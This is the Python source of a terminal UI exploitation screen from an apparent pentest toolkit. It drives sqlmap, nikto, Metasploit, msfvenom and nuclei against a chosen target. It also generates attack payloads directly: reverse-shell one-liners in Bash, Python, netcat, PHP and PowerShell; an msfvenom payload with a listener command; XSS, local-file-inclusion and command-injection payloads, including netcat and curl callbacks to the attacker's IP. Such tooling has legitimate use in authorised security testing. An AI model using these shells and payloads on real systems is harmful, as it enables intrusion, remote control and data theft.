"""Exploitation screen for vulnerability testing."""

import asyncio
import shutil
from textual.app import ComposeResult
from textual.containers import Container, Vertical, Horizontal, ScrollableContainer
from textual.screen import Screen
from textual.widgets import Static, Button, Input, DataTable, ListView, ListItem, Label, Select, TextArea
from textual.binding import Binding

from voidwave.tui.widgets.output import ToolOutput


class ExploitScreen(Screen):
    """Vulnerability exploitation module."""

    CSS = """
    ExploitScreen {
        layout: grid;
        grid-size: 2 2;
        grid-rows: 1fr 1fr;
        grid-columns: 1fr 2fr;
    }

    #menu-panel {
        row-span: 2;
        border: solid green;
        padding: 1;
    }

    #content-panel {
        border: solid cyan;
        padding: 1;
    }

    #output-panel {
        border: solid yellow;
        padding: 1;
    }

    .panel-title {
        text-style: bold;
        margin-bottom: 1;
    }

    .action-item {
        padding: 0 1;
    }

    .action-item:hover {
        background: $accent;
    }

    .result-table {
        height: 100%;
    }

    #payload-area {
        height: 10;
    }
    """

    BINDINGS = [
        Binding("escape", "app.pop_screen", "Back"),
        Binding("r", "refresh", "Refresh"),
    ]

    MENU_ITEMS = [
        ("searchsploit", "Searchsploit", "searchsploit"),
        ("sqlmap", "SQLmap", "sqlmap"),
        ("nikto", "Nikto Vuln", "nikto"),
        ("msfconsole", "Metasploit", "msfconsole"),
        ("msfvenom", "MSFvenom Payload", "msfvenom"),
        ("revshell", "Reverse Shell", "revshell"),
        ("xsstrike", "XSS Test", "xsstrike"),
        ("lfi", "LFI Test", "lfi_test"),
        ("cmdi", "Command Injection", "cmdi_test"),
        ("nuclei-exp", "Nuclei Exploits", "nuclei_exploits"),
    ]

    def __init__(self) -> None:
        super().__init__()
        self.current_target: str = ""

    def compose(self) -> ComposeResult:
        """Compose the exploit screen layout."""
        with Vertical(id="menu-panel"):
            yield Static("[bold magenta]EXPLOIT[/]", classes="panel-title")
            yield Static("Target:", classes="label")
            yield Input(placeholder="IP, URL, or service", id="target-input")
            yield Static("─" * 20)
            yield Static("Payload Type:", classes="label")
            yield Select(
                [
                    ("windows/meterpreter/reverse_tcp", "win-meterpreter"),
                    ("linux/x64/shell_reverse_tcp", "linux-shell"),
                    ("php/reverse_php", "php-shell"),
                    ("python/shell_reverse_tcp", "python-shell"),
                ],
                id="payload-select",
                value="win-meterpreter",
            )
            yield Static("─" * 20)
            yield Static("Actions:", classes="panel-title")
            with ListView(id="action-list"):
                for item_id, label, _ in self.MENU_ITEMS:
                    yield ListItem(Label(label), id=item_id, classes="action-item")

        with ScrollableContainer(id="content-panel"):
            yield Static("[bold cyan]Results / Payload[/]", classes="panel-title")
            yield DataTable(id="results-table", classes="result-table")
            yield TextArea(id="payload-area", read_only=True)

        with Vertical(id="output-panel"):
            yield Static("[bold yellow]Output[/]", classes="panel-title")
            yield ToolOutput(id="tool-output")

    def on_mount(self) -> None:
        """Initialize the results table."""
        table = self.query_one("#results-table", DataTable)
        table.add_columns("Type", "Exploit/Finding", "Details")

    async def on_list_view_selected(self, event: ListView.Selected) -> None:
        """Handle menu selection."""
        item_id = event.item.id
        for menu_id, _, action_name in self.MENU_ITEMS:
            if menu_id == item_id:
                action_method = getattr(self, f"action_{action_name}", None)
                if action_method:
                    await action_method()
                break

    def _get_target(self) -> str:
        """Get the current target."""
        input_widget = self.query_one("#target-input", Input)
        return input_widget.value.strip()

    def _get_payload(self) -> str:
        """Get the selected payload type."""
        select = self.query_one("#payload-select", Select)
        return str(select.value)

    def _write_output(self, message: str, level: str = "info") -> None:
        """Write to output panel."""
        output = self.query_one("#tool-output", ToolOutput)
        if level == "success":
            output.write_line(f"[green]{message}[/]")
        elif level == "error":
            output.write_line(f"[red]{message}[/]")
        elif level == "warning":
            output.write_line(f"[yellow]{message}[/]")
        else:
            output.write_line(message)

    def _add_result(self, result_type: str, exploit: str, details: str = "") -> None:
        """Add a result to the table."""
        table = self.query_one("#results-table", DataTable)
        table.add_row(result_type, exploit[:60], details[:30])

    def _set_payload_text(self, text: str) -> None:
        """Set the payload text area content."""
        payload_area = self.query_one("#payload-area", TextArea)
        payload_area.load_text(text)

    async def action_searchsploit(self) -> None:
        """Search for exploits using searchsploit."""
        target = self._get_target()
        if not target:
            self.notify("Enter a search term (e.g., 'apache 2.4')", severity="error")
            return

        if not shutil.which("searchsploit"):
            self.notify("searchsploit not installed (exploitdb package)", severity="error")
            return

        self._write_output(f"Searching exploits for: {target}...")

        proc = await asyncio.create_subprocess_exec(
            "searchsploit", target, "--color=never",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()

        for line in stdout.decode().split("\n"):
            line = line.strip()
            if line and "|" in line and not line.startswith("-"):
                parts = line.split("|")
                if len(parts) >= 2:
                    title = parts[0].strip()
                    path = parts[1].strip()
                    self._add_result("Exploit", title, path)
                    self._write_output(f"{title} -> {path}", "success")

        self._write_output("Search complete", "success")

    async def action_sqlmap(self) -> None:
        """Run SQLmap for SQL injection testing."""
        target = self._get_target()
        if not target:
            self.notify("Enter a target URL with parameter", severity="error")
            return

        if not shutil.which("sqlmap"):
            self.notify("sqlmap not installed", severity="error")
            return

        self._write_output(f"Running SQLmap on {target}...")
        self._write_output("This may take a while...", "warning")

        proc = await asyncio.create_subprocess_exec(
            "sqlmap", "-u", target, "--batch", "--level=2", "--risk=1",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()

        for line in stdout.decode().split("\n"):
            line = line.strip()
            if "[+]" in line or "vulnerable" in line.lower():
                self._add_result("SQLi", line, "sqlmap")
                self._write_output(line, "success")
            elif "CRITICAL" in line or "[ERROR]" in line:
                self._write_output(line, "error")

        self._write_output("SQLmap complete", "success")

    async def action_nikto(self) -> None:
        """Run Nikto vulnerability scan."""
        target = self._get_target()
        if not target:
            self.notify("Enter a target URL", severity="error")
            return

        if not shutil.which("nikto"):
            self.notify("nikto not installed", severity="error")
            return

        self._write_output(f"Running Nikto on {target}...")

        proc = await asyncio.create_subprocess_exec(
            "nikto", "-h", target, "-nointeractive",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()

        for line in stdout.decode().split("\n"):
            line = line.strip()
            if "OSVDB" in line or "vulnerability" in line.lower():
                self._add_result("Vuln", line, "nikto")
                self._write_output(line, "warning")

        self._write_output("Nikto complete", "success")

    async def action_msfconsole(self) -> None:
        """Launch Metasploit console."""
        if not shutil.which("msfconsole"):
            self.notify("Metasploit not installed", severity="error")
            return

        self._write_output("Launching Metasploit console...")
        self._write_output("This will open in a new terminal", "warning")

        # Try to open in a new terminal
        terminals = ["gnome-terminal", "konsole", "xterm", "xfce4-terminal"]
        for term in terminals:
            if shutil.which(term):
                await asyncio.create_subprocess_exec(
                    term, "-e", "msfconsole",
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                break
        else:
            self._write_output("Could not find terminal emulator", "error")
            self._write_output("Run 'msfconsole' manually", "warning")

    async def action_msfvenom(self) -> None:
        """Generate payload with msfvenom."""
        if not shutil.which("msfvenom"):
            self.notify("msfvenom not installed", severity="error")
            return

        payload = self._get_payload()
        target = self._get_target()  # Used as LHOST

        if not target:
            self.notify("Enter your IP (LHOST)", severity="error")
            return

        self._write_output(f"Generating payload: {payload}...")

        # Determine format based on payload
        if "windows" in payload:
            fmt = "exe"
            ext = ".exe"
        elif "linux" in payload:
            fmt = "elf"
            ext = ".elf"
        elif "php" in payload:
            fmt = "raw"
            ext = ".php"
        else:
            fmt = "raw"
            ext = ".txt"

        proc = await asyncio.create_subprocess_exec(
            "msfvenom", "-p", payload,
            f"LHOST={target}", "LPORT=4444",
            "-f", fmt,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode == 0:
            output_file = f"/tmp/payload{ext}"
            with open(output_file, "wb") as f:
                f.write(stdout)
            self._write_output(f"Payload saved to: {output_file}", "success")
            self._add_result("Payload", payload, output_file)

            # Show command for handler
            handler_cmd = f"""
# Start handler:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {target}; set LPORT 4444; exploit"
"""
            self._set_payload_text(handler_cmd)
        else:
            self._write_output(f"Error: {stderr.decode()}", "error")

    async def action_revshell(self) -> None:
        """Generate reverse shell one-liners."""
        target = self._get_target()
        if not target:
            self.notify("Enter your IP (LHOST)", severity="error")
            return

        self._write_output(f"Generating reverse shells for {target}:4444...")

        shells = {
            "Bash": f"bash -i >& /dev/tcp/{target}/4444 0>&1",
            "Python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{target}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
            "Netcat": f"nc -e /bin/bash {target} 4444",
            "PHP": f"php -r '$sock=fsockopen(\"{target}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{target}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }

        all_shells = ""
        for name, cmd in shells.items():
            self._add_result("RevShell", name, "4444")
            all_shells += f"# {name}\n{cmd}\n\n"

        self._set_payload_text(all_shells)
        self._write_output("Reverse shells generated", "success")
        self._write_output(f"Start listener: nc -lvnp 4444", "warning")

    async def action_xsstrike(self) -> None:
        """Test for XSS vulnerabilities."""
        target = self._get_target()
        if not target:
            self.notify("Enter a target URL with parameter", severity="error")
            return

        if shutil.which("xsstrike"):
            self._write_output(f"Running XSStrike on {target}...")
            proc = await asyncio.create_subprocess_exec(
                "xsstrike", "-u", target, "--skip",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            for line in stdout.decode().split("\n"):
                if "XSS" in line or "vulnerable" in line.lower():
                    self._add_result("XSS", line, "xsstrike")
                    self._write_output(line, "warning")
        else:
            # Provide manual XSS payloads
            self._write_output("XSStrike not installed, providing manual payloads...", "warning")
            payloads = [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'-alert(1)-'",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                "javascript:alert('XSS')",
            ]
            for payload in payloads:
                self._add_result("XSS", payload, "manual")
            self._set_payload_text("\n".join(payloads))

        self._write_output("XSS test complete", "success")

    async def action_lfi_test(self) -> None:
        """Test for Local File Inclusion."""
        target = self._get_target()
        if not target:
            self.notify("Enter a target URL with file parameter", severity="error")
            return

        self._write_output(f"Testing LFI on {target}...")

        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "/proc/self/environ",
        ]

        for payload in lfi_payloads:
            test_url = target.replace("FUZZ", payload) if "FUZZ" in target else f"{target}{payload}"
            self._add_result("LFI", payload, "test")

        self._set_payload_text("\n".join(lfi_payloads))
        self._write_output("LFI payloads generated - test manually", "warning")

    async def action_cmdi_test(self) -> None:
        """Test for command injection."""
        target = self._get_target()
        if not target:
            self.notify("Enter a target URL with injectable parameter", severity="error")
            return

        self._write_output(f"Generating command injection payloads...")

        cmdi_payloads = [
            "; id",
            "| id",
            "|| id",
            "&& id",
            "$(id)",
            "`id`",
            "; sleep 5",
            "| sleep 5",
            "; curl http://YOURIP/",
            "| nc -e /bin/sh YOURIP 4444",
        ]

        for payload in cmdi_payloads:
            self._add_result("CMDi", payload, "test")

        self._set_payload_text("\n".join(cmdi_payloads))
        self._write_output("Command injection payloads generated", "success")

    async def action_nuclei_exploits(self) -> None:
        """Run Nuclei with exploit templates."""
        target = self._get_target()
        if not target:
            self.notify("Enter a target URL", severity="error")
            return

        if not shutil.which("nuclei"):
            self.notify("nuclei not installed", severity="error")
            return

        self._write_output(f"Running Nuclei exploits on {target}...")

        proc = await asyncio.create_subprocess_exec(
            "nuclei", "-u", target, "-t", "cves/", "-t", "vulnerabilities/",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()

        for line in stdout.decode().split("\n"):
            line = line.strip()
            if line and "[" in line:
                severity = "info"
                if "[critical]" in line.lower() or "[high]" in line.lower():
                    severity = "error"
                elif "[medium]" in line.lower():
                    severity = "warning"
                self._add_result("CVE", line, "nuclei")
                self._write_output(line, severity)

        self._write_output("Nuclei exploits scan complete", "success")

    def action_refresh(self) -> None:
        """Clear results and refresh."""
        table = self.query_one("#results-table", DataTable)
        table.clear()
        output = self.query_one("#tool-output", ToolOutput)
        output.clear()
        self._set_payload_text("")
        self.notify("Results cleared")
